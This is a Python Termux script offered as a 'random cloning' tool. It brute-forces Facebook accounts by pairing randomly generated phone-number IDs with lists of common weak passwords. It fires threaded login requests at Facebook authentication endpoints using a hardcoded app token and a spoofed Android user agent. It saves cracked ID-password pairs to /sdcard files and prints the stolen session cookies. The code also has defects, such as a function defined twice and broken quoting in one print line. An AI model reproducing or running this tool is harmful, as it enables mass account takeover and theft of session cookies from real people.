"""
Note : I AM KING OF TERMUX WORLD

"""


import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError as net_error
from concurrent.futures import ThreadPoolExecutor as speed

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
digits = []
okacc = []
cpacc = []

def logo():
    os.system("clear")
    print(banner)

def linex():
    print(f"{w}==================================================")

def xxx(x):
    return f"{w}[{g}{x}{w}]"

def main():
    logo()
    print(f" {xxx('1')} Random Cloning ")
    print(f" {xxx('2')} Contact with Author ")
    print(f" {xxx('3')} Exit Tools ")
    linex()
    ALONE = input(f" {xxx('?')} Select : ")
    if "1" in ALONE:
        r_number()
    elif "2" in ALONE:
        os.system("xdg-open https://www.facebook.com/MR.K4ZIM.404")
        main()
    elif "3" in ALONE:
        linex()
        print(f" {xxx('!')} {g}Thanks For Using Tools ")
        linex()
        sys.exit()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def r_number():
    logo()
    print(f" {xxx('1')} AFG Cloning")
    print(f" {xxx('2')} AFG pubg id Cloning ")
    print(f" {xxx('3')} MIX id Cloning ")
    linex()
    c = input(f" {xxx('?')} Select : ")
    if "1" in c:
        Afg()
    elif "2" in c:
        Afg()
    elif "3" in c:
        Afgia()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def Afg():
    logo()
    print(f" {xxx('•')} Example : {g}9378, 9370, 9377, 9376 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (1) ")
    print(f" {xxx('2')} Method (2) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love,code+love,"afghanistan","10002000","Afghan123","afghan12345","kabul123","100200"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def Afg():
    logo()
    print(f" {xxx('•')} Example : {g}9370, 9378, 9374, 9377")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (1) ")
    print(f" {xxx('2')} Method (2) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love[1:],love,code+love,"pubg","PUBG","Pubg123","PUBG12345",]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def Afgia():
    logo()
    print(f" {xxx('•')} Example : {g}9378    "9377       9376     9374")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (1) ")
    print(f" {xxx('2')} Method (2) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love,code+love,"khan123","Pubg123,kabul123,PUBG12345"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def m1(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[ALONE-M1] [{loop}/{total_idz}] [OK/CP] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = "[FBAN/FB5A;FBAV/465.0.0.80.26;FBBV/87969472;FAfgM/{density=2.0,width=1080,height=1440};FBLC/bn_IN;FBRV/450966348;FBCR/Jazz;FBMF/realme;FBAfg/realme;FBPN/com.facebook.katana;FAfgV/RMX6182;FBSV/11;FBOP/1;FBCA/x64:arm64-v8a;]"
            data = {
                "email": uid,
                "password": pw,
                "cpl": "true",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "source": "login",
                "format": "json",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
            }
            headers = {
                "accept-encoding": "gzip, deflate", 
                "Accept": "*/*", 
                "Connection": "keep-alive", 
                "content-type": "application/x-www-form-urlencoded", 
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", 
                "x-fb-friendly-name": "authenticate", 
                "x-fb-http-engine": "Liger",
                "user-agent": ua_string,
            }
            url = "https://1.facebook.com/method/auth.login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[ALONE-OK] {uid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/ALONE-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif result["error_code"] == 405:
                print(f" {r}[ALONE-CP] {uid} | {pw}")
                open("/sdcard/ALONE-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

def m2(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[ALONE-M2] [{loop}/{total_idz}] [OK/CP] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = "[FBAN/FB5A;FBAV/465.0.0.80.26;FBBV/87969472;FAfgM/{density=2.0,width=1080,height=1440};FBLC/bn_IN;FBRV/450966348;FBCR/Jazz;FBMF/realme;FBAfg/realme;FBPN/com.facebook.katana;FAfgV/RMX6182;FBSV/11;FBOP/1;FBCA/x64:arm64-v8a;]"
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": uid,
                "password": pw,
                "generate_analytics_claims": "1",
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "fb_api_req_friendly_name": "authenticate",
            }
            headers = {
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "AـKING-Friendly-Name": "unknown",
                "X-FB-Connection-Type": "unknown",
                "User-Agent": ua_string,
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-FB-HTTP-Engine": "Liger",
            }
            url = "https://2.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                try:
                    uid = result["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[ALONE😜-OK] {uid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/ALONE😜-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                try:
                    uid = result["error"]["error_data"]["uid"]
                except:
                    uid = uid
                print(f" {r}[ALOME😓-CP] {uid} | {pw}")
                open("/sdcard/ALONE-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

banner = f"""{w}\
{w} :::'###::::'##::::::::'#######::'##::: ##:'########:
::'## ##::: ##:::::::'##.... ##: ###:: ##: ##.....::
:'##:. ##:: ##::::::: ##:::: ##: ####: ##: ##:::::::
'##:::. ##: ##::::::: ##:::: ##: ## ## ##: ######:::
 #########: ##::::::: ##:::: ##: ##. ####: ##...::::
 ##.... ##: ##::::::: ##:::: ##: ##:. ###: ##:::::::
 ##:::: ##: ########:. #######:: ##::. ##: ########:
..:::::..::........:::.......:::..::::..::........::
{g}      Gifted By //AFG BOY
{w}==================================================
{w} >> Author  : ALONEـــــــ👿👑ــــــــKING
{w} >> FROM  :  AFGHANISTAN
{w} >> Verison :  0.2
{w}==================================================\
"""

if __name__ == "__main__":
    main()
